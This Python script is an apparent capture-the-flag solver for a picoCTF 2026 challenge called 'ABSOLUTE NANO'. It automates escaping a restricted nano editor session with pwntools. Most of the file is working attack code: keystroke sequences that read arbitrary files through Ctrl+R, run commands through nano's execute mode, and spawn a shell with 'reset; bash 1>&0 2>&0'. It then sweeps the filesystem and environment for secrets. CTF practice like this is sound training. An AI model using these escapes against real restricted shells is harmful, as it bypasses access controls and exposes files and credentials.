#!/usr/bin/env python3
"""
ABSOLUTE NANO - picoCTF 2026
Category: General Skills | Points: 200

The challenge gives you a nano editor session. You need to escape it
and read the flag. Nano has built-in capabilities to read files and
execute commands (documented on GTFOBins).

This script automates the interaction using pwntools to send the
appropriate keystrokes to nano to read the flag.

Requirements:
    pip install pwntools

Usage:
    python3 solve.py [HOST] [PORT]

    Or for SSH-based challenges:
    python3 solve.py --ssh HOST PORT USERNAME [PASSWORD]
"""

import sys
import re
import time
import argparse

# Nano control key sequences
CTRL_R = b'\x12'  # Ctrl+R = Read File / Insert File
CTRL_X = b'\x18'  # Ctrl+X = Exit (or Execute in read-file mode)
CTRL_T = b'\x14'  # Ctrl+T = Execute Command / To Spell
CTRL_C = b'\x03'  # Ctrl+C = Cancel
ENTER = b'\n'

# Common flag file locations
FLAG_PATHS = [
    "/flag.txt",
    "/flag",
    "/home/ctf/flag.txt",
    "/root/flag.txt",
    "/home/user/flag.txt",
    "/challenge/flag.txt",
]


def extract_flag(data):
    """Search for picoCTF flag pattern in data."""
    if isinstance(data, bytes):
        data = data.decode('utf-8', errors='replace')
    match = re.search(r'picoCTF\{[^}]+\}', data)
    if match:
        return match.group(0)
    return None


def try_read_file(io, filepath):
    """
    Use nano's Ctrl+R (Read File) to insert a file's contents.
    Returns the received data.
    """
    # Ctrl+R to open "Read File" prompt
    io.send(CTRL_R)
    time.sleep(0.5)

    # Type the file path and press Enter
    io.send(filepath.encode() + ENTER)
    time.sleep(1)

    # Read whatever nano shows us
    data = io.recv(timeout=2)
    return data


def try_execute_command(io, command):
    """
    Use nano's Ctrl+R then Ctrl+X (or Ctrl+T) to execute a command.
    The command output is inserted into the editor buffer.
    Returns the received data.
    """
    # Ctrl+R to open "Read File" prompt
    io.send(CTRL_R)
    time.sleep(0.3)

    # Ctrl+X to switch to "Execute Command" mode (works in many nano versions)
    io.send(CTRL_X)
    time.sleep(0.3)

    # Type command and press Enter
    io.send(command.encode() + ENTER)
    time.sleep(1)

    data = io.recv(timeout=2)
    return data


def try_execute_via_ctrl_t(io, command):
    """
    Alternative: use Ctrl+R then Ctrl+T to execute a command.
    Some nano versions use Ctrl+T instead of Ctrl+X for execute mode.
    """
    io.send(CTRL_R)
    time.sleep(0.3)

    io.send(CTRL_T)
    time.sleep(0.3)

    io.send(command.encode() + ENTER)
    time.sleep(1)

    data = io.recv(timeout=2)
    return data


def solve_remote(host, port):
    """Connect to a remote challenge via TCP and solve it."""
    from pwn import remote, context
    context.log_level = 'info'

    print(f"[*] Connecting to {host}:{port}...")
    io = remote(host, int(port))

    # Wait for nano to initialize
    time.sleep(2)
    initial = io.recv(timeout=3)
    print(f"[*] Initial data received ({len(initial)} bytes)")

    flag = extract_flag(initial)
    if flag:
        print(f"[FLAG] {flag}")
        io.close()
        return flag

    # Method 1: Try reading flag files directly with Ctrl+R
    print("\n[*] Method 1: Trying to read flag files directly with Ctrl+R...")
    for path in FLAG_PATHS:
        print(f"  [*] Trying: {path}")
        data = try_read_file(io, path)
        flag = extract_flag(data)
        if flag:
            print(f"\n[FLAG] {flag}")
            io.close()
            return flag

    # Method 2: Execute commands via Ctrl+R then Ctrl+X
    print("\n[*] Method 2: Trying command execution via Ctrl+R, Ctrl+X...")
    commands = [
        "cat /flag.txt",
        "cat /flag",
        "find / -name 'flag*' -exec cat {} \\; 2>/dev/null",
        "ls -la /",
        "ls -la /home/",
        "env",  # Flag might be in environment variables
    ]
    for cmd in commands:
        print(f"  [*] Executing: {cmd}")
        data = try_execute_command(io, cmd)
        flag = extract_flag(data)
        if flag:
            print(f"\n[FLAG] {flag}")
            io.close()
            return flag
        if data:
            print(f"  [>] Output: {data.decode('utf-8', errors='replace')[:200]}")

    # Method 3: Try Ctrl+T variation
    print("\n[*] Method 3: Trying command execution via Ctrl+R, Ctrl+T...")
    for cmd in commands[:3]:
        print(f"  [*] Executing: {cmd}")
        data = try_execute_via_ctrl_t(io, cmd)
        flag = extract_flag(data)
        if flag:
            print(f"\n[FLAG] {flag}")
            io.close()
            return flag
        if data:
            print(f"  [>] Output: {data.decode('utf-8', errors='replace')[:200]}")

    # Method 4: Spawn a shell
    print("\n[*] Method 4: Attempting to spawn a shell...")
    data = try_execute_command(io, "bash")
    time.sleep(1)

    # In the shell, try to find the flag
    shell_commands = [
        "cat /flag.txt",
        "cat /flag",
        "find / -name 'flag*' 2>/dev/null | head -5",
        "cat /home/*/flag*",
    ]
    for cmd in shell_commands:
        io.sendline(cmd.encode())
        time.sleep(1)
        data = io.recv(timeout=2)
        flag = extract_flag(data)
        if flag:
            print(f"\n[FLAG] {flag}")
            io.close()
            return flag
        if data:
            print(f"  [>] {data.decode('utf-8', errors='replace')[:200]}")

    print("\n[!] Could not find the flag automatically.")
    print("[*] Dropping to interactive mode. Try manually:")
    print("    Ctrl+R -> type flag path -> Enter")
    print("    Ctrl+R -> Ctrl+X -> type command -> Enter")
    io.interactive()
    io.close()
    return None


def solve_ssh(host, port, username, password=None):
    """Connect to a remote challenge via SSH and solve it."""
    from pwn import ssh as pwnssh, context
    context.log_level = 'info'

    print(f"[*] Connecting via SSH to {username}@{host}:{port}...")

    kwargs = {"host": host, "port": int(port), "user": username}
    if password:
        kwargs["password"] = password

    shell = pwnssh(**kwargs)
    io = shell.process("bash")

    # Try to find and read the flag directly
    io.sendline(b"find / -name 'flag*' 2>/dev/null")
    time.sleep(2)
    data = io.recv(timeout=3)
    print(f"[*] Flag search results: {data.decode('utf-8', errors='replace')}")

    io.sendline(b"cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null || cat ~/flag.txt 2>/dev/null")
    time.sleep(1)
    data = io.recv(timeout=2)
    flag = extract_flag(data)
    if flag:
        print(f"\n[FLAG] {flag}")
        io.close()
        shell.close()
        return flag

    print("[*] Dropping to interactive mode...")
    io.interactive()
    io.close()
    shell.close()
    return None


def main():
    parser = argparse.ArgumentParser(description="ABSOLUTE NANO - picoCTF 2026 Solver")
    parser.add_argument("host", nargs="?", default=None, help="Remote host")
    parser.add_argument("port", nargs="?", default=None, help="Remote port")
    parser.add_argument("--ssh", action="store_true", help="Use SSH connection")
    parser.add_argument("--user", default="ctf-player", help="SSH username (default: ctf-player)")
    parser.add_argument("--password", default=None, help="SSH password")
    args = parser.parse_args()

    print("=" * 60)
    print("ABSOLUTE NANO - picoCTF 2026")
    print("Escape nano editor to read the flag")
    print("=" * 60)

    if not args.host or not args.port:
        print("\n[!] No host/port provided. Showing manual solution steps:\n")
        print("1. Connect to the challenge server")
        print("2. You will be dropped into nano")
        print("3. Press Ctrl+R to open 'Read File' prompt")
        print("4. Type the path to the flag file (e.g., /flag.txt) and press Enter")
        print("   - The flag contents will be inserted into the editor buffer")
        print("")
        print("Alternative (execute a command):")
        print("3. Press Ctrl+R, then press Ctrl+X (or Ctrl+T)")
        print("4. Type: cat /flag.txt")
        print("5. Press Enter -- the flag appears in the buffer")
        print("")
        print("Alternative (spawn a shell):")
        print("3. Press Ctrl+R, then press Ctrl+X (or Ctrl+T)")
        print("4. Type: reset; bash 1>&0 2>&0")
        print("5. Press Enter -- you now have a shell")
        print("6. Run: cat /flag.txt")
        print("")
        print(f"Usage: python3 {sys.argv[0]} <host> <port>")
        print(f"       python3 {sys.argv[0]} --ssh <host> <port> --user ctf-player")
        return

    if args.ssh:
        solve_ssh(args.host, args.port, args.user, args.password)
    else:
        solve_remote(args.host, args.port)


if __name__ == "__main__":
    main()
